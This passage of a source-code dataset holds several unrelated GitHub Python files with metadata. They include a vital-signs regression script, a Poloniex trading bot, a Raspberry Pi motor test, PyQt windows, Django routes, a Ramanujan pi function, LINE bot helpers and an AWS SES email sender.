print(cv_results_resp_rate)\n\ntest_pred_resp_rate=resp_rate_clf.predict(test_embedding_reduced)\nr2_rest_rate=r2_score(resp_rate_test[~np.isnan(resp_rate_test)],test_pred_resp_rate[~np.isnan(resp_rate_test)])\nrmse_rest_rate=mean_squared_error(resp_rate_test[~np.isnan(resp_rate_test)],test_pred_resp_rate[~np.isnan(resp_rate_test)],squared=False)\n\nfig2,ax2=plt.subplots(1)\nax2.scatter(resp_rate_test[~np.isnan(resp_rate_test)],test_pred_resp_rate[~np.isnan(resp_rate_test)])\nax2.plot([20,100],[20,100],'r--')\nax2.set_xlabel(\"Observed\")\nax2.set_ylabel(\"Predicted\")\nax2.set_title(\"Respiratory rate\")\n# fig2.savefig(f\"/home/pmwaniki/Dropbox/tmp/contrastive_resp_rate_{os.uname()[1]}_{experiment}.png\")\nplt.show()\n\njoblib.dump(resp_rate_clf,os.path.join(data_dir,f\"results/weights/Regression_resp_rate_{experiment}.joblib\"))\n#spo2*****************************************************************************************************************\nplt.hist(spo2_train[spo2_train>70])\nplt.show()\n\npw_transformer=PowerTransformer(method='box-cox',standardize=True)\nplt.hist(pw_transformer.fit_transform(spo2_train[spo2_train>70].reshape(-1,1)))\nplt.show()\n\nq_transformer=QuantileTransformer(n_quantiles=20)\nplt.hist(q_transformer.fit_transform(spo2_train[spo2_train>70].reshape(-1,1)))\nplt.show()\n\n\nspo2_clf=regressor()\nspo2_clf.fit(classifier_embedding_reduced[spo2_train>80,:],spo2_train[spo2_train>80])\n\n# cv_results_spo2=pd.DataFrame({'params':spo2_clf.cv_results_['params'],\n#                               'rmse':spo2_clf.cv_results_['mean_test_neg_root_mean_squared_error'],\n#               'R2':spo2_clf.cv_results_['mean_test_r2'],\n#                               'max_error':spo2_clf.cv_results_['mean_test_max_error'],\n#                           # 'precision':clf.cv_results_['mean_test_precision']\n#                               })\n# print(cv_results_spo2)\n\ntest_pred_spo2=spo2_clf.predict(test_embedding_reduced)\nr2_spo2=r2_score(spo2_test[spo2_test>80],test_pred_spo2[spo2_test>80])\nrmse_spo2=mean_squared_error(spo2_test[spo2_test>80],test_pred_spo2[spo2_test>80],squared=False)\n\nfig2,ax2=plt.subplots(1)\nax2.scatter(spo2_test[spo2_test>80],test_pred_spo2[spo2_test>80])\nax2.plot([80,100],[80,100],'r--')\nax2.set_xlabel(\"Observed\")\nax2.set_ylabel(\"Predicted\")\nax2.set_title(\"SPO2\")\n# fig2.savefig(f\"/home/pmwaniki/Dropbox/tmp/contrastive_resp_rate_{os.uname()[1]}_{experiment}.png\")\nplt.show()\n\njoblib.dump(spo2_clf,os.path.join(data_dir,f\"results/weights/Regression_spo2_{experiment}.joblib\"))\n\n#combined plot ******************************************************************************************************************************************\n\nhr_clf=joblib.load(os.path.join(data_dir,f\"results/weights/Regression_hr_{experiment}.joblib\"))\ntest_pred_hr=hr_clf.predict(test_embedding_reduced)\nr2_hr=r2_score(hr_test[hr_test!=0],test_pred_hr[hr_test !=0 ])\nrmse_hr=mean_squared_error(hr_test[hr_test!=0],test_pred_hr[hr_test !=0 ],squared=False)\n\nresp_rate_clf=joblib.load(os.path.join(data_dir,f\"results/weights/Regression_resp_rate_{experiment}.joblib\"))\ntest_pred_resp_rate=resp_rate_clf.predict(test_embedding_reduced)\nr2_rest_rate=r2_score(resp_rate_test[~np.isnan(resp_rate_test)],test_pred_resp_rate[~np.isnan(resp_rate_test)])\nrmse_rest_rate=mean_squared_error(resp_rate_test[~np.isnan(resp_rate_test)],test_pred_resp_rate[~np.isnan(resp_rate_test)],squared=False)\n\nspo2_clf=joblib.load(os.path.join(data_dir,f\"results/weights/Regression_spo2_{experiment}.joblib\"))\ntest_pred_spo2=spo2_clf.predict(test_embedding_reduced)\nr2_spo2=r2_score(spo2_test[spo2_test>80],test_pred_spo2[spo2_test>80])\nrmse_spo2=mean_squared_error(spo2_test[spo2_test>80],test_pred_spo2[spo2_test>80],squared=False)\n\n\nfig,axs=plt.subplots(1,3,figsize=(12,4))\n\naxs[0].scatter(test_pred_hr[hr_test !=0 ],hr_test[hr_test!=0],)\naxs[0].plot([50,225],[50,225],'r--')\naxs[0].text(0.05,0.90,f\"r2={r2_hr:.2f}\\nrmse={rmse_hr:.1f}\",transform=axs[0].transAxes,\n            bbox={'boxstyle':\"round\",'facecolor':\"wheat\",'alpha':0.5})\naxs[0].set_ylabel(\"Observed\")\naxs[0].set_xlabel(\"Predicted\")\naxs[0].set_title(\"Heart rate\")\n\naxs[1].scatter(test_pred_resp_rate[~np.isnan(resp_rate_test)],resp_rate_test[~np.isnan(resp_rate_test)],)\naxs[1].plot([20,100],[20,100],'r--')\naxs[1].text(0.05,0.9,f\"r2={r2_rest_rate:.2f}\\nrmse={rmse_rest_rate:.1f}\",transform=axs[1].transAxes,\n            bbox={'boxstyle':\"round\",'facecolor':\"wheat\",'alpha':0.5})\naxs[1].set_ylabel(\"Observed\")\naxs[1].set_xlabel(\"Predicted\")\naxs[1].set_title(\"Respiratory rate\")\n\naxs[2].scatter(test_pred_spo2[spo2_test>70],spo2_test[spo2_test>70],)\naxs[2].plot([80,100],[80,100],'r--')\naxs[2].text(0.05,0.9,f\"r2={r2_spo2:.2f}\\nrmse={rmse_spo2:.1f}\",transform=axs[2].transAxes,\n            bbox={'boxstyle':\"round\",'facecolor':\"wheat\",'alpha':0.5})\naxs[2].set_ylabel(\"Observed\")\naxs[2].set_xlabel(\"Predicted\")\naxs[2].set_title(\"SPO2\")\nplt.savefig(os.path.join(output_dir,f\"Regression plots - {experiment}.png\"))\nplt.show()\n\n\nsave_regression(model=experiment,rmse=rmse_hr,r2=r2_hr,details='heart rate',\n                other=json.dumps({k:v for k,v in hr_clf.best_params_.items() if k != \"select__score_func\"}))\n\nsave_regression(model=experiment,rmse=rmse_rest_rate,r2=r2_rest_rate,details='respiratory rate',\n                other=json.dumps({k:v for k,v in resp_rate_clf.best_params_.items() if k != \"select__score_func\"}))\n\nsave_regression(model=experiment,rmse=rmse_spo2,r2=r2_spo2,details='SpO2',\n                other=json.dumps({k:v for k,v in spo2_clf.best_params_.items() if k != \"select__score_func\"}))\n"}
{"blob_id": "c5ae68ac39744627984058ff6f32fa85d4a591e8", "directory_id": "d3c80bb2e2c9acdddefbb90107c32ab5d5bc46ad", "path": "/makerbot.py", "content_id": "8765a5875daccca1cd1a4c6efdecb13abd56b6a4", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "jacobf18/CryptoTrading", "snapshot_id": "c162346b1165a68455040766ec45a5c9fb64bbc0", "revision_id": "f10b2101861487ba5e9f5bac2a7ad7468586c1ff", "branch_name": "refs/heads/master", "visit_date": "2020-07-03 00:29:18.207117", "revision_date": "2019-08-27 04:47:11", "committer_date": "2019-08-27 04:47:11", "github_id": "201725927", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1813", "extension": "py", "content": "from Account import Account\nfrom Orders import LimitBuyOrder, LimitSellOrder\nimport time\nimport ccxt\n\nif __name__ == '__main__':\n    # Create an account\n    account = Account()\n\n    # Determine the spread\n    def find_maker_fee(exchange):\n        return exchange.fetch_trading_fees()['maker']\n\n    def find_profit(exchange, symbol, fee, capital):\n        orderbook = exchange.fetch_l2_order_book(symbol)\n        bid = orderbook['bids'][0][0] if len (orderbook['bids']) > 0 else None\n        ask = orderbook['asks'][0][0] if len (orderbook['asks']) > 0 else None\n        spread = (ask - bid) if (bid and ask) else None\n        fee = capital * 0.0015\n        maxProfit = (spread * (capital/bid)) - (2 * fee) - (2 * spread / 10)\n        return [bid, ask, maxProfit, len(orderbook['bids']), len(orderbook['asks']), spread]\n        \n    makerFee = find_maker_fee(account.poloniex)\n    markets = account.poloniex.fetch_markets()\n    symbols = []\n    capital = 15\n\n    for m in markets:\n        base = m['symbol']\n        base = base[base.find('/')+1:]\n        if base == 'USDT':\n            symbols.append(m['symbol'])\n    \n    for s in symbols:\n        bid, ask, maxProfit, bidVolume, askVolume, spread = find_profit(account.poloniex, s, makerFee, capital)\n        if maxProfit > 0.5:\n            price = bid + (spread / 10)\n            print(s, maxProfit, bid, bidVolume, askVolume, price)\n            buyOrder = LimitBuyOrder(account.poloniex, s, capital / price, price)\n            buyOrder.place()\n            while buyOrder.status() != 'closed':\n                print('Not Closed')\n                time.sleep(0.01)\n            print(buyOrder)\n            price = ask - (spread / 10)\n            sellOrder = LimitSellOrder(account.poloniex, s, capital / price, price)\n            print(sellOrder)\n            break"}
{"blob_id": "65361077499cc08d3e34eb59513c3d34627598fc", "directory_id": "d5fb51258797358df66986552714f30cf93bc06f", "path": "/python/motorTestRaw.py", "content_id": "16af010d3594a223a5dc15225ac57c6613286d21", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "Al033/PiRoCon", "snapshot_id": "0c9942f351899dcf7f6b30ceface18c4f59ce2b8", "revision_id": "de51e65f12a6ab827a5d565ed9cd86059a4fe049", "branch_name": "refs/heads/master", "visit_date": "2020-12-28 09:31:21.877184", "revision_date": "2015-02-23 17:24:17", "committer_date": "2015-02-23 17:24:17", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1510", "extension": "py", "content": "# initio Motor Test\n# Moves: Forward, Reverse, turn Right, turn Left, Stop - then repeat\n# Press Ctrl-C to stop\n#\n# Writes directly to motors without using the library\n#\n# To check wiring is correct ensure the order of movement as above is correct\n# Run using: sudo python motorTesta.py\n\n\nimport time, RPi.GPIO as gpio\n\n#Motors\nL1 = 19\nL2 = 21\nR1 = 24\nR2 = 26\n\ngpio.setmode(gpio.BOARD)\ngpio.setup(L1, gpio.OUT)\ngpio.setup(L2, gpio.OUT)\ngpio.setup(R1, gpio.OUT)\ngpio.setup(R2, gpio.OUT)\n\n\np = gpio.PWM(L1, 20)\np.start(0)\np.ChangeDutyCycle(100)\n\ndef forward():\n    gpio.output(L1, 1)\n    gpio.output(L2, 0)\n    gpio.output(R1, 1)\n    gpio.output(R2, 0)\n\ndef reverse():\n    gpio.output(L1, 0)\n    gpio.output(L2, 1)\n    gpio.output(R1, 0)\n    gpio.output(R2, 1)\n\ndef spinLeft():\n    gpio.output(L1, 0)\n    gpio.output(L2, 1)\n    gpio.output(R1, 1)\n    gpio.output(R2, 0)\n\ndef spinRight():\n    gpio.output(L1, 1)\n    gpio.output(L2, 0)\n    gpio.output(R1, 0)\n    gpio.output(R2, 1)\n\ndef stop():\n    gpio.output(L1, 0)\n    gpio.output(L2, 0)\n    gpio.output(R1, 0)\n    gpio.output(R2, 0)\n\n# main loop\ntry:\n    while True:\n        forward()\n        print 'Forward'\n        time.sleep(3)\n        reverse()\n        print 'Reverse'\n        time.sleep(3)\n        spinRight()\n        print 'Spin Right'\n        time.sleep(3)\n        spinLeft()\n        print 'Spin Left'\n        time.sleep(3)\n        stop()\n        print 'Stop'\n        time.sleep(3)\n\nexcept KeyboardInterrupt:\n    print\n\nfinally:\n    gpio.cleanup()\n    \n"}
{"blob_id": "b63e66aca31704138cad391f5578fb2ee54c1219", "directory_id": "4077bced3021f2206dd299081847d69ccc3c0c3b", "path": "/EX45/windows.py", "content_id": "d8c82ea9d2cf428ec9df7bf0be5b639795ff0406", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "PiaLR/LPTHW", "snapshot_id": "1bd62f9362fe873d1c3770c61e4a511bc6d9656f", "revision_id": "3c256eb7cd54d771415c29807fb3f6c839d8fa02", "branch_name": "refs/heads/master", "visit_date": "2021-01-11 05:59:08.503552", "revision_date": "2016-12-17 13:29:50", "committer_date": "2016-12-17 13:29:50", "github_id": "72002681", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1469", "extension": "py", "content": "import sys\n\nfrom PyQt5.QtWidgets import QApplication, QWidget\nfrom PyQt5.QtWidgets import QPushButton, QLabel, QLineEdit\nfrom PyQt5.QtGui import QPixmap\n\n# two different window classes to make sure I know exactly what's happening\n# and couldn't find out how to put them in one - is that even possible?\nclass SolvedWindow(QWidget):\n    def __init__(self):\n        super(SolvedWindow, self).__init__()\n        self.initGUI()\n\n    def initGUI(self):\n        self.setWindowTitle('CONGRATULATIONS!')\n        # no button or text needed; everything's in the png\n        filepath = \"media/solved.png\"\n        self.mypixmap = QPixmap(filepath)\n        self.myimg = QLabel(self)\n        self.myimg.setPixmap(self.mypixmap)\n\n        pixrect = self.mypixmap.rect()\n        self.setGeometry(10, 10, pixrect.width(), pixrect.height() + 50)\n        self.show()\n\nclass UnsolvedWindow(QWidget):\n    def __init__(self):\n        super(UnsolvedWindow, self).__init__()\n        self.initGUI()\n\n    def initGUI(self):\n        self.setWindowTitle('YOU ARE A SHAME!')\n        # no button or text needed; everything's in the png\n        filepath = \"media/unsolved.png\"\n        self.mypixmap = QPixmap(filepath)\n        self.myimg = QLabel(self)\n        self.myimg.setPixmap(self.mypixmap)\n\n        pixrect = self.mypixmap.rect()\n        self.setGeometry(10, 10, pixrect.width(), pixrect.height() + 50)\n        self.show()\n\n# limiting line length to 80 characters because ... style, that's why.\n"}
{"blob_id": "08b012750b861b3f9cefa6644a02847621533b65", "directory_id": "4f3b0aed43d0ab5d99915196f98d0de5d1de4a8b", "path": "/menuitems/api.py", "content_id": "c476a9ae55b7b4591de3ba24c396aa9302389a12", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "twstddev/django-simple-cms", "snapshot_id": "7dbb1143f7d6099dcc9dab1dd41e0b0279929278", "revision_id": "e0c3df1a69d87ed309ef95405312ed7ce09beb28", "branch_name": "refs/heads/master", "visit_date": "2021-01-17 17:06:19.047895", "revision_date": "2014-06-05 16:45:50", "committer_date": "2014-06-05 16:45:50", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "346", "extension": "py", "content": "from django.conf.urls import patterns, url\nfrom menuitems.views import MenuItemViewSet\n\nmenu_item_list = MenuItemViewSet.as_view( {\n\t\"get\" : \"list\",\n} )\n\nmenu_item_detail = MenuItemViewSet.as_view( {\n\t\"get\" : \"retrieve\",\n} )\n\nurlpatterns = patterns( \"menuitems.views\",\n\turl( r\"^$\", menu_item_list ),\n\turl( r\"^(?P<pk>\\d+)$\", menu_item_detail ),\n)\n"}
{"blob_id": "42ca2602c583dfb5fd463e06832e79cf71f888b5", "directory_id": "fa80eeb89943cd0bfac60d90e656d6ae31d1d23c", "path": "/mathForSocialScience/midterm_report/RJpi.py", "content_id": "fa7c352c268d362c81b15dd1e671efb2521486ec", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "jourdy345/2016spring", "snapshot_id": "843b5e37c8ef34b51e7de7773e0603be347c0317", "revision_id": "bc61a8558fc727fbe2e73db80a3e9e36819a56ee", "branch_name": "refs/heads/master", "visit_date": "2021-01-21 04:47:14.937340", "revision_date": "2016-06-09 15:56:51", "committer_date": "2016-06-09 15:56:51", "github_id": "53733514", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "359", "extension": "py", "content": "import math\nfrom __future__ import division\ndef RJpi(tau):\n\tn = 0.0\n\tk1 = 26390.0\n\tk2 = 1103.0\n\tk3 = 396.0\n\teps = tau + 1.0\n\trjpi = 0\n\tepsList = []\n\twhile(eps > tau):\n\t\teps = math.factorial(4.0*n)/((math.factorial(n))**4.0) * (k1 * n + k2)/(k3**(4.0*n))\n\t\tepsList.append(eps)\n\t\trjpi += eps\n\t\tn += 1\n\trjpi = 9801.0/(math.sqrt(8)*rjpi)\n\treturn rjpi, epsList\n\n\n\n"}
{"blob_id": "b9d6c1a1773aa1c6e456bedf84811a37abce63fe", "directory_id": "723f01a98715c53b1eef63bb61488c6a90dc9b56", "path": "/bot/line/line_utilities.py", "content_id": "def3f962a8819443809d8b42dab43d8c20d1f73c", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "CdecPGL/LBot", "snapshot_id": "f21353734422f1a7fe3975236559fb62bf2af66b", "revision_id": "2136900bfb4bfd6a2fe762c65714a4596b98fc6d", "branch_name": "refs/heads/master", "visit_date": "2022-12-13 11:58:15.957722", "revision_date": "2018-01-18 13:52:47", "committer_date": "2018-01-18 13:52:47", "github_id": "117981189", "star_events_count": "1", "fork_events_count": "0", "gha_license_id": "MIT", "gha_event_created_at": "2022-12-07 23:44:12", "gha_created_at": "2018-01-18 12:40:44", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "5465", "extension": "py", "content": "'''LINE\u95a2\u9023\u306eUtility\u95a2\u6570\u7fa4'''\r\n\r\nfrom ..authorities import UserAuthority\r\nfrom ..exceptions import GroupNotFoundError, UserNotFoundError\r\nfrom ..models import Group, LineGroup, LineUser, User\r\nfrom .line_settings import api as line_api\r\n\r\n\r\ndef get_user_by_line_user_id_from_database(line_user_id: str)->User:\r\n    '''LINE\u306e\u30e6\u30fc\u30b6\u30fcID\u3067\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u304b\u3089\u30e6\u30fc\u30b6\u30fc\u3092\u53d6\u5f97\u3059\u308b\u3002\u306a\u3044\u5834\u5408\u306f\u4f5c\u6210\u3059\u308b'''\r\n    try:\r\n        return User.objects.get(line_user__user_id__exact=line_user_id)\r\n    except User.DoesNotExist:\r\n        raise UserNotFoundError(\r\n            \"\u30e6\u30fc\u30b6\u30fc(LineUserID: {})\u304c\u898b\u3064\u304b\u308a\u307e\u305b\u3093\u3067\u3057\u305f\u3002\".format(line_user_id))\r\n\r\n\r\ndef get_group_by_line_group_id_from_database(line_group_id: str)->Group:\r\n    '''LINE\u306e\u30b0\u30eb\u30fc\u30d7ID\u3067\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u304b\u3089\u30b0\u30eb\u30fc\u30d7\u3092\u53d6\u5f97\u3059\u308b'''\r\n    try:\r\n        return Group.objects.get(line_group__group_id__exact=line_group_id)\r\n    except Group.DoesNotExist:\r\n        raise GroupNotFoundError(\r\n            \"\u30b0\u30eb\u30fc\u30d7(LineGroupID: {})\u304c\u898b\u3064\u304b\u308a\u307e\u305b\u3093\u3067\u3057\u305f\u3002\".format(line_group_id))\r\n\r\n\r\ndef register_user_by_line_user_id(line_user_id: str)->User:\r\n    '''LINE\u30e6\u30fc\u30b6\u30fcID\u3067\u30e6\u30fc\u30b6\u30fc\u3092\u767b\u9332\u3059\u308b\u3002\u623b\u308a\u5024\u306f\u65b0\u3057\u3044\u30e6\u30fc\u30b6\u30fc\u30c7\u30fc\u30bf'''\r\n    user_profile = line_api.get_profile(line_user_id)\r\n    name = user_profile.display_name\r\n    # LINE\u30e6\u30fc\u30b6\u30fc\u3092\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306b\u767b\u9332\r\n    new_line_user = LineUser.objects.create(user_id=line_user_id, name=name)\r\n    try:\r\n        # \u30e6\u30fc\u30b6\u3092\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306b\u767b\u9332\r\n        counter = 1\r\n        name_candidate = name\r\n        # \u91cd\u8907\u304c\u306a\u3044\u3088\u3046\u306b\u5fc5\u8981\u306a\u3089\u540d\u524d\u306b\u30a4\u30f3\u30c7\u30c3\u30af\u30b9\u3092\u4ed8\u3051\u308b\r\n        while User.objects.filter(name=name_candidate).exists():\r\n            name_candidate = name + str(counter)\r\n            counter += 1\r\n        new_user = User.objects.create(name=name_candidate, line_user=new_line_user,\r\n                                       authority=UserAuthority.Watcher.name)\r\n        print(\"\u30e6\u30fc\u30b6\u30fc(LineID: {}, Name: {})\u3092\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306b\u767b\u9332\u3057\u307e\u3057\u305f\u3002\".format(line_user_id, name))\r\n        return new_user\r\n    except Exception:\r\n        new_line_user.delete()\r\n        raise\r\n\r\n\r\ndef register_user_by_line_user_id_in_group(line_user_id: str, line_group_id: str)->User:\r\n    '''LINE\u30e6\u30fc\u30b6\u30fcID\u3068LINE\u30b0\u30eb\u30fc\u30d7ID\u3067\u3067\u30e6\u30fc\u30b6\u30fc\u3092\u767b\u9332\u3059\u308b\u3002\r\n    LINEID\u306b\u7d10\u4ed8\u3044\u305f\u30b0\u30eb\u30fc\u30d7\u304c\u4f5c\u6210\u3055\u308c\u3066\u3044\u308b\u5fc5\u8981\u304c\u3042\u308a\u3001\u7d10\u4ed8\u3044\u3066\u3044\u308b\u30b0\u30eb\u30fc\u30d7\u306b\u3082\u30e6\u30fc\u30b6\u30fc\u304c\u767b\u9332\u3055\u308c\u308b\u3002\r\n    \u623b\u308a\u5024\u306f\u65b0\u3057\u3044\u30e6\u30fc\u30b6\u30fc\u30c7\u30fc\u30bf\u3002'''\r\n    new_user = None\r\n    new_line_user = None\r\n    try:\r\n        user_profile = line_api.get_group_member_profile(\r\n            line_group_id, line_user_id)\r\n        name = user_profile.display_name\r\n        # LINE\u30e6\u30fc\u30b6\u30fc\u3092\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306b\u767b\u9332\r\n        new_line_user = LineUser.objects.create(\r\n            user_id=line_user_id, name=name)\r\n        # \u30e6\u30fc\u30b6\u3092\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306b\u767b\u9332\r\n        counter = 1\r\n        name_candidate = name\r\n        # \u91cd\u8907\u304c\u306a\u3044\u3088\u3046\u306b\u5fc5\u8981\u306a\u3089\u540d\u524d\u306b\u30a4\u30f3\u30c7\u30c3\u30af\u30b9\u3092\u4ed8\u3051\u308b\r\n        while User.objects.filter(name=name_candidate).exists():\r\n            name_candidate = name + str(counter)\r\n            counter += 1\r\n        new_user = User.objects.create(name=name_candidate, line_user=new_line_user,\r\n                                       authority=UserAuthority.Watcher.name)\r\n        # \u30b0\u30eb\u30fc\u30d7\u306b\u30e6\u30fc\u30b6\u30fc\u3092\u767b\u9332\r\n        group = get_group_by_line_group_id_from_database(line_group_id)\r\n        group.members.add(new_user)\r\n        group.save()\r\n        print(\"\u30e6\u30fc\u30b6\u30fc(LineID: {}, Name: {})\u3092\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306b\u767b\u9332\u3057\u307e\u3057\u305f\u3002\".format(line_user_id, name))\r\n        return new_user\r\n    except Exception:\r\n        if new_line_user:\r\n            new_line_user.delete()\r\n        if new_line_user:\r\n            new_user.delete()\r\n        raise\r\n\r\n\r\ndef register_group_by_line_group_id(line_group_id: str)->Group:\r\n    '''LINE\u30e6\u30fc\u30b6\u30fcID\u3067\u30e6\u30fc\u30b6\u30fc\u3092\u767b\u9332\u3059\u308b\u3002\u623b\u308a\u5024\u306f\u65b0\u3057\u3044\u30e6\u30fc\u30b6\u30fc\u30c7\u30fc\u30bf\u3002\r\n    \u30b0\u30eb\u30fc\u30d7\u540d\u306f\u30b0\u30eb\u30fc\u30d7\u6570\u304b\u3089\u81ea\u52d5\u3067\u300c\u30b0\u30eb\u30fc\u30d7**\u300d\u3068\u4ed8\u3051\u3089\u308c\u308b\u3002'''\r\n    # LINE\u30b0\u30eb\u30fc\u30d7\u3092\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306b\u767b\u9332\r\n    new_line_group = LineGroup.objects.create(group_id=line_group_id)\r\n    try:\r\n        # \u30e6\u30fc\u30b6\u3092\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306b\u767b\u9332\r\n        total_group_count = Group.objects.count()\r\n        # \u30b0\u30eb\u30fc\u30d7\u540d\u3092\u81ea\u52d5\u3067\u6c7a\u5b9a\r\n        while Group.objects.filter(name=\"\u30b0\u30eb\u30fc\u30d7{}\".format(total_group_count)):\r\n            total_group_count += 1\r\n        new_group = Group.objects.create(name=\"\u30b0\u30eb\u30fc\u30d7{}\".format(\r\n            total_group_count), line_group=new_line_group)\r\n        print(\"\u30b0\u30eb\u30fc\u30d7(LineID: {})\u3092\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u306b\u767b\u9332\u3057\u307e\u3057\u305f\u3002\".format(line_group_id))\r\n        return new_group\r\n    except Exception:\r\n        new_line_group.delete()\r\n        raise\r\n\r\n\r\ndef add_member_to_group_if_need(user: User, group: Group)->bool:\r\n    '''\u30e6\u30fc\u30b6\u30fc\u304c\u30b0\u30eb\u30fc\u30d7\u306b\u5c5e\u3057\u3066\u3044\u308b\u78ba\u8a8d\u3057\u3066\u3001\u5c5e\u3057\u3066\u3044\u306a\u3044\u306a\u3089\u767b\u9332\u3059\u308b\u3002\r\n        \u623b\u308a\u5024\u306f\u8ffd\u52a0\u3055\u308c\u305f\u304b\u3069\u3046\u304b\u3002'''\r\n    if not group.members.filter(id=user.id).exists():\r\n        print(\"\u30e6\u30fc\u30b6\u30fc\u300c{}\u300d\u3092\u30b0\u30eb\u30fc\u30d7\u300c{}\u300d\u306b\u767b\u9332\u3002\".format(user.name, group.name))\r\n        group.members.add(user)\r\n        group.save()\r\n        return True\r\n    else:\r\n        return False\r\n"}
{"blob_id": "368c454a58ce06c18cdb14a72eec829091b1c990", "directory_id": "9ebb1dd1cc6a5c4ffa29294025a5869ad2fe4454", "path": "/python/SendEmail.py", "content_id": "c2b18002978b85a76dd4dc6587e08672718ebd31", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "bharanisruthi/aws-servicedesk-chatbot", "snapshot_id": "0435034a6d89693953dda96988a40b6f648ad768", "revision_id": "5d3508d25e447ad522742e3da0e506b422f54c7b", "branch_name": "refs/heads/master", "visit_date": "2021-06-02 13:21:31.515664", "revision_date": "2017-07-18 23:57:52", "committer_date": "2017-07-18 23:57:52", "github_id": "97639089", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "2853", "extension": "py", "content": "import json\nimport re\nimport boto3\nfrom sdconf import  messages_config\nfrom email.utils import parseaddr\n\nprint('Loading function')\n\n\ndef verify_email(sender, email, client):\n    verifyRecepient = client.verify_email_address(EmailAddress=email)\n    # verifyDomain = client.verify_domain_identity(Domain='gmail.com',)\n    verifySender = client.verify_email_address(EmailAddress=sender)\n    if verifyRecepient is not None:\n        return \"Unable to verify Recepient Email Address\"\n    else:\n        return True\n\n\ndef validateEmail(email, text, ticketid,identifier):\n    # email = event[\"currentIntent\"][\"slots\"][\"Email_Id\"]\n    #email = 'sruthi223@gmail.com'\n    sender = \"bharanisruthi17@gmail.com\"\n    match = re.match('^[_a-z0-9-]+(\\.[_a-z0-9-]+)*@[a-z0-9-]+(\\.[a-z0-9-]+)*(\\.[a-z]{2,4})$', email)\n    if match == None:\n        print('Bad Syntax')\n    else:\n        print(match)\n        # awsregion = \"us-west-2\"\n        client = boto3.client('ses')\n        #verifyEmail = verify_email(sender, email, client)\n        if True:\n            subject = \"Ticket Status Update for \"+ str(ticketid)\n            htmlbody = messages_config.emailMessage + \"for the ticket id \" +str(ticketid)\n            textbody = None\n            if identifier == \"logIssue\":\n            # The email body for recipients with non-HTML email clients.\n                textbody = \"Ticket ID: \"+ticketid +\"has been logged for the issue, \"+text\n            elif identifier == \"updateIssue\" :\n                textbody = \"Ticket ID: \"+ticketid +\"has been updated with the information, \"+text\n            else:\n                textbody = None\n            # The character encoding for the email.\n            charset = \"UTF-8\"\n\n            # Try to send the email.\n            try:\n                # Provide the contents of the email.\n                response = client.send_email(\n                    Destination={\n                        'ToAddresses': [\n                            email,\n                        ],\n                    },\n                    Message={\n                        'Body': {\n                            'Html': {\n                                'Charset': charset,\n                                'Data': htmlbody,\n                            },\n                            'Text': {\n                                'Charset': charset,\n                                'Data': textbody,\n                            },\n                        },\n                        'Subject': {\n                            'Charset': charset,\n                            'Data': subject,\n                        },\n                    },\n                    Source=sender,\n                )\n            # Display an error if something goes wrong.\n            except Exception as e:\n                print(\"Error: \", e)\n            else:\n                print(\"Email sent!\")\n"}
{"blob_id": "62da20225b5af908f0ff70e87fb3ad679eae1688", "directory_id": "e52c7431f1b14444de52fd943a39fcaabeca21e4", "path": "/torch_geometric/sparse/__init__.py", "content_id": "faa61231fd6d50a6b07f253fe18fdf19e1b6117f", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "jwyang/pytorch_geometric", "snapshot_id": "72d3a62f6991d90edb3b8da6445e18421f2174a8", "revision_id": "31043b182248852768317a4185384390e95217d5", "branch_name": "refs/heads/master", "visit_date": "2021-08-30 16:16:03.613724", "revision_date": "2017-12-18 15:52:08", "committer_date": "2017-12-18 15:52:08", "github_id": "114831322", "star_events_count": "0", "fork_events_count": "1", "gha_license_id": "None", "gha_event_created_at": "2017-12-20 02:02:54", "gha_created_at": "2017-12-20 02:02:53", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "228", "extension": "py", "content": "from .sparse import SparseTensor\nfrom .mm import mm\nfrom .mm_diagonal import mm_diagonal\nfrom .sum import sum\nfrom .eye import eye\nfrom .stack import stack\n\n__all__ = ['SparseTensor', 'mm', 'mm_diagonal', 'sum', 'eye', 'stack']\n"}
